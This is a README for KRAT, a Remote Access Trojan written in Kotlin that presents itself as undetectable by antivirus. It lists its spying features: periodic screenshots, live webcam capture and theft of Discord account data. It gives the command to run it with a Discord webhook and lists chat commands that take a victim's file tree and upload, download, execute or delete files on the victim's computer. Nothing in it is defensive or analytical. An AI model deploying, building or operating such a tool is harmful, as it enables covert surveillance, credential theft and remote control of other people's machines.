### Current status: 🟢[Undetected](https://virustotal.com)

# KRAT

A RAT (Remote Access Trojan) written in Kotlin.

## Features
- Get periodicals screenshots
- Get real-time webcam
- Sends Discord account information
- On-demand actions
- Everything silently and undetectable by antivirus

## Usage
1. Download the latest release and put it on a server
2. Run the `.jar` file with your Discord webhook link as parameter

```sh
java -jar KRAT.jar <webhook-link>
```

## On-demand actions
- `!webcam`: take a webcam capture and send it
- `!screenshot`: take a screenshot and send it
- `!filtree`: sends the victim's file tree
- `!upload <link> <absolute-path>`: upload a file to the victim
- `!download <absolute-path>`: download a file from the victim
- `!run <file>`: execute a file on the victim's computer
- `!delete <absolute-path>`: delete a file from the victim's computer
- 

[//]: # (3. The program will connect to your Discord bot and ask for configuration)

## Stack
- [Kotlin](https://kotlinlang.org/)
- [Kord](https://kordlib.github.io/kord/)
- [webcam-capture](https://github.com/sarxos/webcam-capture)